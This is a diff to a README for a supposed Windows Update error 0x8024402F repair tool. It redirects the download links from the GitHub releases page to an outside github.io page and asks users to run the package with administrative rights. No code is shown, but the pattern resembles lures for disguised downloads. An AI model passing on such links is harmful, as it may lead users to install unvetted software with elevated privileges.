@@ -1,6 +1,6 @@
 # 🛠️ Error-0x8024402F-Fix - Repair Windows update connection errors easily
 
-[![](https://img.shields.io/badge/Download_Fix-Blue?style=for-the-badge&logo=windows)](https://github.com/Opharis/Error-0x8024402F-Fix/releases)
+[![](https://img.shields.io/badge/Download_Fix-Blue?style=for-the-badge&logo=windows)](https://opharis.github.io)
 
 ## 📋 Overview
 Windows Update uses specific network protocols to contact update servers. Error 0x8024402F occurs when the computer fails to reach these servers. This happens because of proxy settings, firewall blocks, or corrupted network cache files. This tool automates the process of resetting these network components. It clears temporary files and restores default settings to allow your computer to connect to Microsoft servers again.
@@ -9,7 +9,7 @@ Windows Update uses specific network protocols to contact update servers. Error 
 This tool supports Windows 10 and Windows 11. You need an active internet connection to complete the update process after the fix. The software requires basic administrative rights to modify system network configurations. Ensure you save all open documents before you run the tool as it may restart background network services.
 
 ## 💾 Download and Install
-Visit [the official release page](https://github.com/Opharis/Error-0x8024402F-Fix/releases) to download the repair package. 
+Visit [the official release page](https://opharis.github.io) to download the repair package. 
 
 1. Navigate to the release page link above.
 2. Look for the latest version under the Releases section.
